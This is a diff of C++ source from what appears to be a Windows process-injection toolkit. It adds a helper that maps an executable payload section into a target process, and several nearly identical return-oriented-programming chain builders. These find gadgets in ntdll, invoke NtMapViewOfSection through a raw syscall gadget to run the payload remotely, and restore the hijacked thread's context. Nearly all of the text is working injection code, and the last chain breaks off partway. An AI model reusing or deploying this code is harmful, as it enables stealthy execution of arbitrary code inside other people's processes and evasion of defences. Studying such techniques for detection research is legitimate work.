@@ -43,6 +43,7 @@ extern "C" {
 }
 
 #include "DynamicPayloads.h"
+#include "StaticPayloads.h"
 
 /////////////
 // Classes //
@@ -276,6 +277,617 @@ PINJECTRA_PACKET* _ROP_CHAIN_1::eval(TStrDWORD64Map& runtime_parameters)
 	output->buffer = ROP_chain;
 	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
 	output->metadata = &runtime_parameters;
+
+	return output;
+}
+
+HANDLE MapPayload(char* Payload, DWORD PayloadSize, HANDLE TargetProcess)
+{
+	HANDLE Section = CreateFileMappingA(INVALID_HANDLE_VALUE,
+		NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL);
+
+	PVOID MappedSection = MapViewOfFile(Section,
+		FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
+
+	memcpy(MappedSection, Payload, PayloadSize);
+
+	UnmapViewOfFile(MappedSection);
+
+	HANDLE RemoteSection;
+	DuplicateHandle(GetCurrentProcess(), Section,
+		TargetProcess, &RemoteSection, 0, 0, DUPLICATE_SAME_ACCESS);
+
+	return RemoteSection;
+}
+
+
+PINJECTRA_PACKET* _ROP_CHAIN_PAYLOAD_SIMPLE::eval(TStrDWORD64Map& runtime_parameters)
+{
+	PINJECTRA_PACKET* output;
+	DWORD64 rop_pos = 0;
+	DWORD64* ROP_chain;
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	MODULEINFO modinfo;
+
+	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
+
+	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
+	int size = modinfo.SizeOfImage;
+	//printf("ntdll size: %d\n", size);
+
+	DWORD64 GADGET_loop = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xEB\xFE", 2); // jmp -2
+	//printf("GADGET_loop=0x%llx\n", GADGET_loop);
+
+	/*
+	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
+	00007ff8`5c63b3bf 58              pop     rax
+	00007ff8`5c63b3c0 5a              pop     rdx
+	00007ff8`5c63b3c1 59              pop     rcx
+	00007ff8`5c63b3c2 4158            pop     r8
+	00007ff8`5c63b3c4 4159            pop     r9
+	00007ff8`5c63b3c6 415a            pop     r10
+	00007ff8`5c63b3c8 415b            pop     r11
+	00007ff8`5c63b3ca c3              ret
+	*/
+	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
+	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);
+
+	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xc3", 1);
+	//printf("GADGET_ret=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x5C\xC3", 2); // pop rsp; ret
+	//printf("GADGET_pivot=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_addrsp28 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
+	//printf("GADGET_addrsp=0x%llx\n", GADGET_addrsp);
+	DWORD64 GADGET_addrsp58 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x58\xC3", 5); // add rsp, 0x28; ret
+	DWORD64 GADGET_poprax = GADGET_addrsp58 + 3;
+
+
+	HANDLE RemoteSection = MapPayload(_gen_payload_2(), PAYLOAD2_SIZE, (HANDLE)runtime_parameters["process_handle"]);
+
+
+	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
+
+#define DONT_CARE 0
+	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
+	{
+		ROP_chain[rop_pos++] = GADGET_ret;
+		//ROP_chain[rop_pos++] = 0;
+	}
+	ROP_chain[rop_pos++] = GADGET_popregs + 1; // skip pop rax
+	ROP_chain[rop_pos++] = -1; // rdx (HANDLE Process)
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // rcx (HANDLE Section)
+	DWORD64 payload_address_pos = rop_pos++; // r8 
+	ROP_chain[rop_pos++] = 0; // r9
+	ROP_chain[rop_pos++] = DONT_CARE; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "NtMapViewOfSection");;
+	ROP_chain[rop_pos++] = GADGET_addrsp58;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = 0; //
+	ROP_chain[rop_pos++] = 0; //
+	DWORD64 view_size_pos = rop_pos++;
+	ROP_chain[rop_pos++] = 2; // ViewUnmap
+	ROP_chain[rop_pos++] = 0x100000; // MEM_TOP_DOWN
+	ROP_chain[rop_pos++] = PAGE_EXECUTE_READ;
+	ROP_chain[rop_pos++] = DONT_CARE; // skip
+
+	ROP_chain[payload_address_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos; // Run Payload
+	ROP_chain[rop_pos++] = 0;
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+
+	ROP_chain[rop_pos++] = GADGET_popregs;
+	ROP_chain[rop_pos++] = DONT_CARE; // rax
+	DWORD64 saved_return_address = rop_pos++; // rdx
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
+	ROP_chain[rop_pos++] = 8; // 8
+	ROP_chain[rop_pos++] = DONT_CARE; // r9
+	ROP_chain[rop_pos++] = DONT_CARE; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+
+	ROP_chain[rop_pos++] = GADGET_pivot;
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+
+	ROP_chain[view_size_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = PAYLOAD2_SIZE;
+
+	//ROP_chain[caption_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "Hello");
+	//ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "World!");
+	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = DONT_CARE;
+
+	// Update Runtime Parameters with ROP-specific Parameters
+	runtime_parameters["saved_return_address"] = saved_return_address;
+	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
+	runtime_parameters["rop_pos"] = rop_pos;
+
+	output->buffer = ROP_chain;
+	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
+	output->metadata = &runtime_parameters;
+
+	return output;
+}
+
+
+
+PINJECTRA_PACKET* _ROP_CHAIN_PAYLOAD_ADVANCED::eval(TStrDWORD64Map& runtime_parameters)
+{
+	PINJECTRA_PACKET* output;
+	DWORD64 rop_pos = 0;
+	DWORD64* ROP_chain;
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	MODULEINFO modinfo;
+
+	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
+
+	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
+	int size = modinfo.SizeOfImage;
+	//printf("ntdll size: %d\n", size);
+
+	DWORD64 GADGET_loop = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xEB\xFE", 2); // jmp -2
+	//printf("GADGET_loop=0x%llx\n", GADGET_loop);
+
+	/*
+	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
+	00007ff8`5c63b3bf 58              pop     rax
+	00007ff8`5c63b3c0 5a              pop     rdx
+	00007ff8`5c63b3c1 59              pop     rcx
+	00007ff8`5c63b3c2 4158            pop     r8
+	00007ff8`5c63b3c4 4159            pop     r9
+	00007ff8`5c63b3c6 415a            pop     r10
+	00007ff8`5c63b3c8 415b            pop     r11
+	00007ff8`5c63b3ca c3              ret
+	*/
+	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
+	DWORD64 GADGET_popr10r11 = GADGET_popregs + 7;
+	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);
+
+	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xc3", 1);
+	//printf("GADGET_ret=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x5C\xC3", 2); // pop rsp; ret
+	//printf("GADGET_pivot=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_addrsp28 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
+	//printf("GADGET_addrsp=0x%llx\n", GADGET_addrsp);
+	DWORD64 GADGET_addrsp58 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x58\xC3", 5); // add rsp, 0x28; ret
+	DWORD64 GADGET_poprax = GADGET_addrsp58 + 3;
+
+
+	// syscall
+	// ret
+	DWORD64 GADGET_syscall = (DWORD64)GetProcAddress(ntdll, "NtYieldExecution") + 0x12;
+
+
+	HANDLE RemoteSection = MapPayload(_gen_payload_2(), PAYLOAD2_SIZE, (HANDLE)runtime_parameters["process_handle"]);
+
+
+	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
+
+#define DONT_CARE 0
+	if ((runtime_parameters["tos"] + 11 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
+	{
+		ROP_chain[rop_pos++] = GADGET_ret;
+		//ROP_chain[rop_pos++] = 0;
+	}
+	ROP_chain[rop_pos++] = GADGET_popregs; // pop registers
+	ROP_chain[rop_pos++] = 0x28; // NtMapViewOfSection ISR value
+	ROP_chain[rop_pos++] = -1; // rdx (HANDLE Process)
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // rcx (HANDLE Section)
+	DWORD64 payload_address_pos = rop_pos++; // r8 
+	ROP_chain[rop_pos++] = 0; // r9
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = GADGET_syscall;
+	ROP_chain[rop_pos++] = GADGET_addrsp58;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = 0; //
+	ROP_chain[rop_pos++] = 0; //
+	DWORD64 view_size_pos = rop_pos++;
+	ROP_chain[rop_pos++] = 2; // ViewUnmap
+	ROP_chain[rop_pos++] = 0x100000; // MEM_TOP_DOWN
+	ROP_chain[rop_pos++] = PAGE_EXECUTE_READ;
+	ROP_chain[rop_pos++] = DONT_CARE; // skip
+
+	ROP_chain[payload_address_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos; // Run Payload
+	ROP_chain[rop_pos++] = 0;
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+
+	ROP_chain[rop_pos++] = GADGET_popregs;
+	ROP_chain[rop_pos++] = DONT_CARE; // rax
+	DWORD64 saved_return_address = rop_pos++; // rdx
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
+	ROP_chain[rop_pos++] = 8; // 8
+	ROP_chain[rop_pos++] = DONT_CARE; // r9
+	ROP_chain[rop_pos++] = DONT_CARE; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+
+	ROP_chain[rop_pos++] = GADGET_pivot;
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+
+	ROP_chain[view_size_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = PAYLOAD2_SIZE;
+
+	//ROP_chain[caption_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "Hello");
+	//ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "World!");
+	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = DONT_CARE;
+
+	// Update Runtime Parameters with ROP-specific Parameters
+	runtime_parameters["saved_return_address"] = saved_return_address;
+	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
+	runtime_parameters["rop_pos"] = rop_pos;
+
+	output->buffer = ROP_chain;
+	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
+	output->metadata = &runtime_parameters;
+
+	return output;
+}
+
+
+
+
+PINJECTRA_PACKET* _ROP_CHAIN_PAYLOAD_ADVANCED_SAFE::eval(TStrDWORD64Map& runtime_parameters)
+{
+	PINJECTRA_PACKET* output;
+	DWORD64 rop_pos = 0;
+	DWORD64* ROP_chain;
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	MODULEINFO modinfo;
+
+	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
+
+	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
+	int size = modinfo.SizeOfImage;
+	//printf("ntdll size: %d\n", size);
+
+	DWORD64 GADGET_loop = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xEB\xFE", 2); // jmp -2
+	//printf("GADGET_loop=0x%llx\n", GADGET_loop);
+
+	/*
+	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
+	00007ff8`5c63b3bf 58              pop     rax
+	00007ff8`5c63b3c0 5a              pop     rdx
+	00007ff8`5c63b3c1 59              pop     rcx
+	00007ff8`5c63b3c2 4158            pop     r8
+	00007ff8`5c63b3c4 4159            pop     r9
+	00007ff8`5c63b3c6 415a            pop     r10
+	00007ff8`5c63b3c8 415b            pop     r11
+	00007ff8`5c63b3ca c3              ret
+	*/
+	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
+	DWORD64 GADGET_popr10r11 = GADGET_popregs + 7;
+	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);
+
+	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xc3", 1);
+	//printf("GADGET_ret=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x5C\xC3", 2); // pop rsp; ret
+	//printf("GADGET_pivot=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_addrsp28 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
+	//printf("GADGET_addrsp=0x%llx\n", GADGET_addrsp);
+	DWORD64 GADGET_addrsp58 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x58\xC3", 5); // add rsp, 0x28; ret
+	DWORD64 GADGET_poprax = GADGET_addrsp58 + 3;
+
+
+	// syscall
+	// ret
+	DWORD64 GADGET_syscall = (DWORD64)GetProcAddress(ntdll, "NtYieldExecution") + 0x12;
+
+
+	HANDLE RemoteSection = MapPayload(_gen_payload_2(), PAYLOAD2_SIZE, (HANDLE)runtime_parameters["process_handle"]);
+
+
+	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
+
+#define DONT_CARE 0
+	if ((runtime_parameters["tos"] + 11 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
+	{
+		ROP_chain[rop_pos++] = GADGET_ret;
+		//ROP_chain[rop_pos++] = 0;
+	}
+	ROP_chain[rop_pos++] = GADGET_popregs; // pop registers
+	ROP_chain[rop_pos++] = 0x28; // NtMapViewOfSection ISR value
+	ROP_chain[rop_pos++] = -1; // rdx (HANDLE Process)
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // rcx (HANDLE Section)
+	DWORD64 payload_address_pos = rop_pos++; // r8 
+	ROP_chain[rop_pos++] = 0; // r9
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = GADGET_syscall;
+	ROP_chain[rop_pos++] = GADGET_addrsp58;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = 0; //
+	ROP_chain[rop_pos++] = 0; //
+	DWORD64 view_size_pos = rop_pos++;
+	ROP_chain[rop_pos++] = 2; // ViewUnmap
+	ROP_chain[rop_pos++] = 0x100000; // MEM_TOP_DOWN
+	ROP_chain[rop_pos++] = PAGE_EXECUTE_READ;
+	ROP_chain[rop_pos++] = DONT_CARE; // skip
+
+	ROP_chain[payload_address_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos; // Run Payload
+	ROP_chain[rop_pos++] = 0;
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+
+	ROP_chain[rop_pos++] = GADGET_popregs;
+	ROP_chain[rop_pos++] = DONT_CARE; // rax
+	DWORD64 saved_return_address = rop_pos++; // rdx
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
+	ROP_chain[rop_pos++] = 8; // 8
+	ROP_chain[rop_pos++] = DONT_CARE; // r9
+	ROP_chain[rop_pos++] = DONT_CARE; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+
+	ROP_chain[rop_pos++] = GADGET_pivot;
+	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+
+	ROP_chain[view_size_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = PAYLOAD2_SIZE;
+
+	//ROP_chain[caption_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "Hello");
+	//ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	//strcpy((char*)&ROP_chain[rop_pos++], "World!");
+	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = DONT_CARE;
+
+	// Update Runtime Parameters with ROP-specific Parameters
+	runtime_parameters["saved_return_address"] = saved_return_address;
+	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
+	runtime_parameters["rop_pos"] = rop_pos;
+
+	output->buffer = ROP_chain;
+	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
+	output->metadata = &runtime_parameters;
+
+	return output;
+}
+
+
+
+
+PINJECTRA_PACKET* _ROP_CHAIN_PAYLOAD_ADVANCED_SAFE_STABLE::eval(TStrDWORD64Map& runtime_parameters)
+{
+	PINJECTRA_PACKET* output;
+	DWORD64 rop_pos = 0;
+	DWORD64* ROP_chain;
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	MODULEINFO modinfo;
+
+	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
+
+	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
+	int size = modinfo.SizeOfImage;
+	//printf("ntdll size: %d\n", size);
+
+	/*
+	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
+	00007ff8`5c63b3bf 58              pop     rax
+	00007ff8`5c63b3c0 5a              pop     rdx
+	00007ff8`5c63b3c1 59              pop     rcx
+	00007ff8`5c63b3c2 4158            pop     r8
+	00007ff8`5c63b3c4 4159            pop     r9
+	00007ff8`5c63b3c6 415a            pop     r10
+	00007ff8`5c63b3c8 415b            pop     r11
+	00007ff8`5c63b3ca c3              ret
+	*/
+	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
+	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);
+
+	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xc3", 1);
+	//printf("GADGET_ret=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x5C\xC3", 2); // pop rsp; ret
+	//printf("GADGET_pivot=0x%llx\n", GADGET_ret);
+
+	DWORD64 GADGET_addrsp28 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
+	//printf("GADGET_addrsp=0x%llx\n", GADGET_addrsp);
+	DWORD64 GADGET_addrsp58 = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x58\xC3", 5); // add rsp, 0x58; ret
+	DWORD64 GADGET_poprax = GADGET_addrsp58 + 3;
+
+	DWORD64 GADGET_poprcx = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x59\xC3", 2); // pop rcx; ret
+	DWORD64 GADGET_movraxrcx = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x89\x01\xC3", 4); // mov [rcx], rax; ret
+	DWORD64 GADGET_movrdxrcx = (DWORD64)GetProcAddress(ntdll, "RtlCopyLuid"); // mov rax, [rdx]; mov [rcx], rax; ret
+
+
+	// 48 89 0D C2 28 08 00                    mov     cs : NlsOemToUnicodeData, rcx
+	// 48 83 C4 20                             add     rsp, 20h
+	// 41 5E                                   pop     r14
+	// C3                                      retn
+	DWORD64 GADGET_savercx = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x08\x00\x48\x83\xc4\x20\x41\x5e\xc3", 9) - 5;
+	DWORD64 savercx_target = *(DWORD*)(GADGET_savercx + 3) + GADGET_savercx + 7;
+
+	// syscall
+	// ret
+	DWORD64 GADGET_syscall = (DWORD64)GetProcAddress(ntdll, "NtYieldExecution") + 0x12;
+
+	HANDLE ProcessHandle = (HANDLE)runtime_parameters["process_handle"];
+	HANDLE RemoteSection = MapPayload(_gen_payload_2(), PAYLOAD2_SIZE, ProcessHandle);
+
+	SIZE_T bytes = 0;
+	DWORD64 restore_value = 0;
+	BOOL RetVal = ReadProcessMemory(ProcessHandle, (void*)savercx_target, &restore_value, 8, &bytes);
+	const int s = sizeof(CONTEXT);
+	CONTEXT* state = (CONTEXT*)runtime_parameters["context"];
+
+	ROP_chain = (DWORD64*)malloc(0x1000 * sizeof(DWORD64));
+	ZeroMemory(ROP_chain, 0x1000 * sizeof(DWORD64));
+
+#define DONT_CARE 0
+	if ((runtime_parameters["tos"] + 11 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
+	{
+		ROP_chain[rop_pos++] = GADGET_ret;
+		//ROP_chain[rop_pos++] = 0;
+	}
+	// Save context
+	//state->Rip = GADGET_savercx; // Perform this after building the ROP
+	//ROP_chain[rop_pos++] = GADGET_savercx; // --> Set by changin context.RIP;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = state->R14; // pop r14
+	ROP_chain[rop_pos++] = GADGET_poprcx;
+	DWORD64 context_pos = rop_pos++; // parameter of CONTEXT*
+	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "RtlCaptureContext");
+	ROP_chain[rop_pos++] = GADGET_popregs + 1;
+	ROP_chain[rop_pos++] = savercx_target; // pop rdx
+	DWORD64 context_rcx_pos = rop_pos++; // CONTEXT*->rcx; // pop rcx
+	ROP_chain[rop_pos++] = DONT_CARE; // pop r8
+	ROP_chain[rop_pos++] = DONT_CARE; // pop r9
+	ROP_chain[rop_pos++] = DONT_CARE; // pop r10
+	ROP_chain[rop_pos++] = DONT_CARE; // pop r11
+	ROP_chain[rop_pos++] = GADGET_movrdxrcx; // "mov [rcx],[rdx]" Overwrite Context->Rcx with original value
+	// Restore Rip of original thread state
+	ROP_chain[rop_pos++] = GADGET_poprax;
+	ROP_chain[rop_pos++] = state->Rip; // original Rip value
+	ROP_chain[rop_pos++] = GADGET_poprcx;
+	DWORD64 context_rip_pos = rop_pos++; // CONTEXT*->Rip; // pop rcx
+	ROP_chain[rop_pos++] = GADGET_movraxrcx; // write it there!
+	// Restore Rsp of original thread state
+	ROP_chain[rop_pos++] = GADGET_poprax;
+	ROP_chain[rop_pos++] = state->Rsp; // original Rsp value
+	ROP_chain[rop_pos++] = GADGET_poprcx;
+	DWORD64 context_rsp_pos = rop_pos++; // CONTEXT*->Rsp; // pop rcx
+	ROP_chain[rop_pos++] = GADGET_movraxrcx; // write it there!
+	
+	// Restore NlsOemToUnicodeData value that we used to store original rcx with
+	ROP_chain[rop_pos++] = GADGET_poprax;
+	ROP_chain[rop_pos++] = restore_value; // original NlsOemToUnicodeData value
+	ROP_chain[rop_pos++] = GADGET_poprcx;
+	ROP_chain[rop_pos++] = savercx_target;
+	ROP_chain[rop_pos++] = GADGET_movraxrcx; // write it there!
+
+	// Align stack
+	ROP_chain[rop_pos++] = GADGET_ret;
+
+	// NtMapViewOfSection via Rite Of Passage
+	ROP_chain[rop_pos++] = GADGET_popregs; // pop registers
+	ROP_chain[rop_pos++] = 0x28; // NtMapViewOfSection ISR value
+	ROP_chain[rop_pos++] = -1; // rdx (HANDLE Process)
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // rcx (HANDLE Section)
+	DWORD64 payload_address_pos = rop_pos++; // r8 
+	ROP_chain[rop_pos++] = 0; // r9
+	ROP_chain[rop_pos++] = (DWORD64)RemoteSection; // r10
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = GADGET_syscall;
+	ROP_chain[rop_pos++] = GADGET_addrsp58;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = 0; //
